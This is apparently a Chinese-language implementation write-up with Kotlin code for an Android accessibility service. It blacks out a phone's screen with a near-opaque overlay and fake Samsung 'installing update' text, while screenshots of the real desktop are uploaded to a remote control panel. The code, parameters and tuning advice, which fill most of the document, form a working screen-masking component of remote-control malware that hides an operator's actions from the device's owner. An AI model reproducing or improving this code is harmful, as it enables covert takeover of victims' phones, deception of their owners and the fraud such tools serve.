# 手机黑屏 + 后台半透明：当前实现

## 效果

```
用户看手机：全黑（像息屏 / 像系统更新中）
中控（后台）看这台设备：偏暗但能透出桌面和 App 内容 —— 也就是"半透明"
```

**关键认知：手机那层黑 和 后台看到的半透明，是两条独立的路。**
手机屏幕上是 254/255 的黑色浮层；后台上传的帧里没有这层浮层（截图拍不到它），
所以暗色是**手机端合成时自己补上去的**。

---

## 一、三条链路（分工）

| 环节 | 谁负责 | 数值/手段 | 作用对象 |
|---|---|---|---|
| 黑屏浮层 | 手机 | `alpha = 254/255` + 背光 0 | 人眼（手机屏幕） |
| 截图 | 手机 | 无障碍 `takeScreenshot`（**不含本服务 2032 浮层**） | 拿到干净桌面 |
| 合成 | 手机 | 桌面 + **40% 黑** + 更新页文字 | 上传给面板的帧 |
| 显示 | 后台 | 无处理，收到什么显示什么 | 面板 |

---

## 二、手机端核心代码

### 1) 铺黑屏浮层（人眼看到黑）

```kotlin
private const val MASK_ALPHA = 254f / 255f        // 0xFE，不是 0xFF

val lp = WindowManager.LayoutParams(
    MATCH_PARENT, MATCH_PARENT,
    2032,                                          // TYPE_ACCESSIBILITY_OVERLAY
    FLAG_NOT_FOCUSABLE or FLAG_NOT_TOUCHABLE or FLAG_KEEP_SCREEN_ON,
    PixelFormat.TRANSLUCENT
).apply {
    gravity = Gravity.TOP or Gravity.START
    screenBrightness = 0f                          // 背光到底，人眼真黑
}

val a = (MASK_ALPHA * 255).toInt()                 // 254
val view = View(service).apply { setBackgroundColor(a shl 24) }   // 0xFE000000
wm.addView(view, lp)
```

> 纯黑档（lockNormal）也可以直接用 `0xFF000000`：反正不上报、不需要透光。
> 需要"面板能透出桌面"的档位才必须用 254。

### 2) 截图 + 合成（面板看到的暗色帧）

```kotlin
// 黑屏期间的面板帧：手机端软件合成，后台零处理
service.takeScreenshot(Display.DEFAULT_DISPLAY, executor, object : TakeScreenshotCallback {
    override fun onSuccess(result: ScreenshotResult) {
        val raw = Bitmap.wrapHardwareBuffer(result.hardwareBuffer, result.colorSpace)
            ?.copy(Bitmap.Config.ARGB_8888, false)
        val scaled = Bitmap.createScaledBitmap(raw, maxWidth, h, true)

        // ★ 40% 黑：面板看到的"半透明暗页"
        val out = scaled.copy(Bitmap.Config.ARGB_8888, true)
        val c = Canvas(out)
        val p = Paint(Paint.ANTI_ALIAS_FLAG)
        p.color = Color.argb((0.40f * 255).toInt(), 0, 0, 0)   // A=102，RGB=0
        c.drawRect(0f, 0f, w.toFloat(), h.toFloat(), p)

        // 再叠更新页文字（SAMSUNG / 进度 / "正在安装"）
        c.drawText("SAMSUNG", w / 2f, h * 0.31f, p)

        upload(out)            // 直接上传，后台不用处理
    }
})
```

即：`输出像素 = 桌面 × 0.6 + 黑 × 0.4`，再叠文字。

### 3) 备用分支：帧里已经带了浮层时用提亮

```kotlin
// 少数 ROM 的 takeScreenshot 会包含自己的 2032 浮层 → 帧已经接近全黑
// 这时不叠黑，改成"把 1/255 的信息拉回来"
val m = ColorMatrix(floatArrayOf(
    40f, 0f, 0f, 0f, 50f,
    0f, 40f, 0f, 0f, 50f,
    0f, 0f, 40f, 0f, 50f,
    0f, 0f, 0f, 1f, 0f))
paint.colorFilter = ColorMatrixColorFilter(m)
canvas.drawBitmap(src, 0f, 0f, paint)     // ×40 + 50
```

正常链路用不到，仅作兼容兜底。

---

## 三、参数表

| 参数 | 值 | 在哪 | 说明 |
|---|---|---|---|
| 浮层 alpha | `254/255`(0xFE) | 手机 | 人眼黑、留 1 色阶 |
| 浮层类型 | `2032` | 手机 | 免悬浮窗权限、按 HOME 不消失 |
| 背光 | `0f` | 手机 | 压到最暗 |
| 合成暗度 | `0.40f`（40%） | 手机上传帧 | 面板看到的"半透明" |
| 备用提亮 | `×40 + 50` | 手机（少用） | 帧里已含浮层时 |
| 后台处理 | **无** | — | 直接显示 |

调参建议：

```
面板觉得太清楚（不像黑屏）→ 0.40 调到 0.5~0.6
面板觉得全黑看不到内容   → 0.40 调到 0.25~0.3
```

---

## 四、必须注意

```
① 浮层不要用 0xFF000000（255）还想"面板透出桌面" —— 255 会把信息压成 0
② 一定要 FLAG_KEEP_SCREEN_ON —— 息屏后屏幕真黑，截图什么都拍不到
③ 合成必须在手机上做：后台每帧 ×40 会掉帧 + 放大噪点，只适合低频单帧
④ 截图不含浮层这一点因 ROM 而异，代码里要两条分支都留着
```
